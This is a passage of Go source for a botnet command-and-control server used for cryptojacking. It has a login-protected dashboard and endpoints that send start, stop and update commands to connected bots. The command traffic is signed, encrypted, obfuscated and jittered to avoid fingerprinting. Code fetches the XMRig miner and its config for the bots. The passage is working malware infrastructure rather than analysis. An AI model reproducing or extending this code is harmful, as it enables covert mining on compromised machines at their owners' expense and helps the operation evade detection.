				ActiveMiners:    activeMiners,
				TotalHashrate:   totalHashrate,
				Bots:            currentBots,
				Users:           getUsers(),
				FlashMessage:    r.URL.Query().Get("flash"),
				CSRFToken:       randomString(32),
				ServerStartTime: serverStartTime,
				MiningStats:     miningStats,
			}

			botsJSON, _ := json.Marshal(data.Bots)
			data.BotsJSON = template.JS(botsJSON)

			tmpl.ExecuteTemplate(w, "dashboard.html", data)
		}))

	http.HandleFunc("/start-mining", requireAuth(
		func(w http.ResponseWriter, r *http.Request, user User) {
			if r.Method != "POST" {
				http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
				return
			}

			// Check command authorization
			if !commandAuthManager.IsAuthorized(user.Level, "START_MINING") {
				auditLogger.LogEvent("AUTHORIZATION", user.Username, "", r.RemoteAddr, "START_MINING_DENIED", "FAILURE", "Insufficient privileges", "WARNING")
				http.Error(w, "Insufficient privileges", http.StatusForbidden)
				return
			}

			if err := sendToBots("START_MINING"); err != nil {
				auditLogger.LogEvent("COMMAND", user.Username, "", r.RemoteAddr, "START_MINING_FAILED", "FAILURE", err.Error(), "ERROR")
				http.Error(w, err.Error(), http.StatusInternalServerError)
				return
			}

			auditLogger.LogEvent("COMMAND", user.Username, "", r.RemoteAddr, "START_MINING", "SUCCESS", "", "INFO")
			w.Write([]byte("Mining started on all bots"))
		}))

	http.HandleFunc("/stop-mining", requireAuth(
		func(w http.ResponseWriter, r *http.Request, user User) {
			if r.Method != "POST" {
				http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
				return
			}

			// Check command authorization
			if !commandAuthManager.IsAuthorized(user.Level, "STOP_MINING") {
				auditLogger.LogEvent("AUTHORIZATION", user.Username, "", r.RemoteAddr, "STOP_MINING_DENIED", "FAILURE", "Insufficient privileges", "WARNING")
				http.Error(w, "Insufficient privileges", http.StatusForbidden)
				return
			}

			if err := sendToBots("STOP_MINING"); err != nil {
				auditLogger.LogEvent("COMMAND", user.Username, "", r.RemoteAddr, "STOP_MINING_FAILED", "FAILURE", err.Error(), "ERROR")
				http.Error(w, err.Error(), http.StatusInternalServerError)
				return
			}

			auditLogger.LogEvent("COMMAND", user.Username, "", r.RemoteAddr, "STOP_MINING", "SUCCESS", "", "INFO")
			w.Write([]byte("Mining stopped on all bots"))
		}))

	http.HandleFunc("/update-miner", requireAuth(
		func(w http.ResponseWriter, r *http.Request, user User) {
			if r.Method != "POST" {
				http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
				return
			}

			// Check command authorization
			if !commandAuthManager.IsAuthorized(user.Level, "UPDATE_MINER") {
				auditLogger.LogEvent("AUTHORIZATION", user.Username, "", r.RemoteAddr, "UPDATE_MINER_DENIED", "FAILURE", "Insufficient privileges", "WARNING")
				http.Error(w, "Insufficient privileges", http.StatusForbidden)
				return
			}

			if err := downloadMiner(); err != nil {
				auditLogger.LogEvent("COMMAND", user.Username, "", r.RemoteAddr, "DOWNLOAD_MINER_FAILED", "FAILURE", err.Error(), "ERROR")
				http.Error(w, err.Error(), http.StatusInternalServerError)
				return
			}

			if err := sendToBots("UPDATE_MINER"); err != nil {
				auditLogger.LogEvent("COMMAND", user.Username, "", r.RemoteAddr, "UPDATE_MINER_FAILED", "FAILURE", err.Error(), "ERROR")
				http.Error(w, err.Error(), http.StatusInternalServerError)
				return
			}

			auditLogger.LogEvent("COMMAND", user.Username, "", r.RemoteAddr, "UPDATE_MINER", "SUCCESS", "", "INFO")
			w.Write([]byte("Miner updated and command sent"))
		}))

	http.HandleFunc("/logout", func(w http.ResponseWriter, r *http.Request) {
		sessionID := getSessionCookie(r)
		if sessionID != "" {
			clearSession(sessionID)
		}
		http.SetCookie(w, &http.Cookie{
			Name:     "session",
			Value:    "",
			Path:     "/",
			MaxAge:   -1,
			Secure:   true,
			HttpOnly: true,
			SameSite: http.SameSiteStrictMode,
		})
		http.Redirect(w, r, "/", http.StatusSeeOther)
	})

	http.Handle("/static/", http.StripPrefix("/static/", http.FileServer(http.Dir("static"))))
	log.Fatal(server.ListenAndServeTLS(CERT_FILE, KEY_FILE))
}

func requireAuth(handler func(http.ResponseWriter, *http.Request, User)) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		sessionID := getSessionCookie(r)
		if sessionID == "" {
			http.Redirect(w, r, "/?flash=Please login first", http.StatusSeeOther)
			return
		}
		user, exists := getSession(sessionID)
		if !exists {
			http.Redirect(w, r, "/?flash=Please login first", http.StatusSeeOther)
			return
		}
		handler(w, r, user)
	}
}

func getSessionCookie(r *http.Request) string {
	cookie, err := r.Cookie("session")
	if err != nil {
		return ""
	}
	return cookie.Value
}

func setSession(id string, user User) {
	sessionLock.Lock()
	defer sessionLock.Unlock()
	sessions[id] = user
}

func getSession(sessionID string) (User, bool) {
	sessionLock.Lock()
	defer sessionLock.Unlock()
	user, exists := sessions[sessionID]
	if !exists {
		return User{}, false
	}
	if time.Since(user.Expire) > SESSION_TIMEOUT {
		delete(sessions, sessionID)
		return User{}, false
	}
	return user, true
}

func clearSession(id string) {
	sessionLock.Lock()
	defer sessionLock.Unlock()
	delete(sessions, id)
}

func authUser(username, password string) (bool, *User) {
	users := getUsers()
	for _, user := range users {
		if user.Username == username && user.Password == password {
			if time.Now().After(user.Expire) {
				return false, nil
			}
			return true, &user
		}
	}
	return false, nil
}

func getUsers() []User {
	data, err := os.ReadFile(USERS_FILE)
	if err != nil {
		return []User{}
	}
	var users []User
	if err := json.Unmarshal(data, &users); err != nil {
		return []User{}
	}
	return users
}

func deleteUser(username string) error {
	users := getUsers()
	if len(users) == 0 {
		return fmt.Errorf("no users found")
	}

	var updatedUsers []User
	found := false
	for _, user := range users {
		if user.Username != username {
			updatedUsers = append(updatedUsers, user)
		} else {
			found = true
		}
	}

	if !found {
		return fmt.Errorf("user '%s' not found", username)
	}

	if err := saveUsers(updatedUsers); err != nil {
		return fmt.Errorf("failed to save updated users: %w", err)
	}

	return nil
}

func saveUsers(users []User) error {
	data, err := json.MarshalIndent(users, "", "  ")
	if err != nil {
		return fmt.Errorf("failed to marshal users: %w", err)
	}

	file, err := os.OpenFile(USERS_FILE, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0600)
	if err != nil {
		return fmt.Errorf("failed to open users file: %w", err)
	}
	defer file.Close()

	if _, err := file.Write(data); err != nil {
		return fmt.Errorf("failed to write users file: %w", err)
	}

	return nil
}

func getBots() []Bot {
	botCountLock.Lock()
	defer botCountLock.Unlock()
	var activeBots []Bot
	for _, b := range bots {
		if b.Conn != nil {
			activeBots = append(activeBots, b)
		}
	}
	return activeBots
}

func getBotCount() int {
	botCountLock.Lock()
	defer botCountLock.Unlock()

	count := 0
	for _, bot := range bots {
		if bot.Conn != nil && time.Since(bot.LastHeartbeat) <= 2*heartbeatInterval {
			count++
		}
	}
	return count
}

func decrementBotCount() {
	botCountLock.Lock()
	defer botCountLock.Unlock()
	if botCount > 0 {
		botCount--
	}
}

func sendToBots(command string) error {
	botCountLock.Lock()
	defer botCountLock.Unlock()

	var lastErr error
	for i, bot := range bots {
		if bot.Conn != nil && bot.Authenticated {
			if err := sendSecureCommand(bot.Conn, command, &bots[i]); err != nil {
				lastErr = err
				botID := fmt.Sprintf("%x", sha256.Sum256([]byte(bot.ClientCert.SerialNumber.String()+bot.IP)))
				auditLogger.LogEvent("COMMAND", "", botID, bot.IP, "SEND_COMMAND_FAILED", "FAILURE", err.Error(), "ERROR")
			}
		}
	}
	return lastErr
}

func sendSecureCommand(conn net.Conn, command string, bot *Bot) error {
	// Create secure command
	nonce := make([]byte, COMMAND_NONCE_SIZE)
	rand.Read(nonce)

	secureCmd := SecureCommand{
		Command:   command,
		Timestamp: time.Now(),
		Nonce:     hex.EncodeToString(nonce),
	}

	// Generate HMAC signature using military-grade BLAKE2b
	cmdData := []byte(secureCmd.Command + secureCmd.Nonce + secureCmd.Timestamp.Format(time.RFC3339))
	signature := generateHMACMilitary(cmdData, hmacKey)
	secureCmd.Signature = hex.EncodeToString(signature)

	// Serialize command
	cmdJSON, err := json.Marshal(secureCmd)
	if err != nil {
		return fmt.Errorf("failed to marshal command: %w", err)
	}

	// Encrypt command using military-grade ChaCha20-Poly1305
	encryptedCmd, err := encryptCommandMilitary(string(cmdJSON), bot.SessionKey)
	if err != nil {
		return fmt.Errorf("failed to encrypt command: %w", err)
	}

	// Obfuscate traffic
	obfuscatedCmd := obfuscateTraffic(encryptedCmd)

	// Add anti-fingerprinting jitter
	addJitter()

	// Send command
	conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
	_, err = conn.Write(append(obfuscatedCmd, '\n'))

	if err == nil {
		botID := fmt.Sprintf("%x", sha256.Sum256([]byte(bot.ClientCert.SerialNumber.String()+bot.IP)))
		auditLogger.LogEvent("COMMAND", "", botID, bot.IP, "COMMAND_SENT", "SUCCESS", command, "INFO")
	}

	return err
}

func downloadMiner() error {
	// Load URLs from secure environment variables
	xmrigURL := os.Getenv("XMRIG_DOWNLOAD_URL")
	if xmrigURL == "" {
		return fmt.Errorf("XMRIG_DOWNLOAD_URL environment variable not set")
	}

	minerConfigURL := os.Getenv("MINER_CONFIG_URL")
	if minerConfigURL == "" {
		return fmt.Errorf("MINER_CONFIG_URL environment variable not set")
	}

	// Load expected file hashes for integrity verification
	xmrigHash := os.Getenv("XMRIG_SHA256")
	configHash := os.Getenv("CONFIG_SHA256")

	if err := downloadFileMilitary(xmrigURL, MinerPath, xmrigHash); err != nil {
		return fmt.Errorf("failed to download miner: %w", err)
	}
	if err := downloadFileMilitary(minerConfigURL, ConfigPath, configHash); err != nil {
		return fmt.Errorf("failed to download config: %w", err)
	}
	return nil
}

// Enhanced secure file download with integrity verification
func downloadFileMilitary(url, path string, expectedHash string) error {
	// Force HTTPS for all downloads
	if !strings.HasPrefix(url, "https://") {
		return fmt.Errorf("insecure download protocol: only HTTPS allowed")
	}

	// Create client with certificate pinning
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{
			MinVersion:         tls.VersionTLS13,
			InsecureSkipVerify: false,
			VerifyConnection: func(cs tls.ConnectionState) error {
				// Implement certificate pinning for download sources
				if len(cs.PeerCertificates) > 0 {
					return certPinner.VerifyPinnedCert("download_source", cs.PeerCertificates[0])
				}
				return fmt.Errorf("no peer certificates for download verification")
			},
		},
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   60 * time.Second,
	}

	resp, err := client.Get(url)
	if err != nil {
		return fmt.Errorf("download request failed: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("download failed with status: %d", resp.StatusCode)
	}

	// Create temporary file
	tempPath := path + ".tmp"
	if err := os.MkdirAll(filepath.Dir(tempPath), 0755); err != nil {
		return fmt.Errorf("failed to create directory: %w", err)
	}

	out, err := os.Create(tempPath)
	if err != nil {
		return fmt.Errorf("failed to create temp file: %w", err)
	}
	defer out.Close()

	// Download with hash verification
	hasher := sha256.New()
	writer := io.MultiWriter(out, hasher)

	_, err = io.Copy(writer, resp.Body)
	if err != nil {
		os.Remove(tempPath)
		return fmt.Errorf("download copy failed: %w", err)
	}

	// Verify file integrity if hash provided
	if expectedHash != "" {
		actualHash := hex.EncodeToString(hasher.Sum(nil))
		if !strings.EqualFold(actualHash, expectedHash) {
			os.Remove(tempPath)
			return fmt.Errorf("file integrity verification failed: expected %s, got %s", expectedHash, actualHash)
		}
	}

	// Atomic move to final location
	if err := os.Rename(tempPath, path); err != nil {
		os.Remove(tempPath)
		return fmt.Errorf("failed to move file to final location: %w", err)
	}

	auditLogger.LogEvent("DOWNLOAD", "SYSTEM", "", "", "FILE_DOWNLOADED", "SUCCESS",
		fmt.Sprintf("URL: %s, Path: %s", url, path), "INFO")

	return nil
}

func downloadFile(url, path string) error {
	// Redirect to military-grade function with empty hash (backward compatibility)
	return downloadFileMilitary(url, path, "")
}
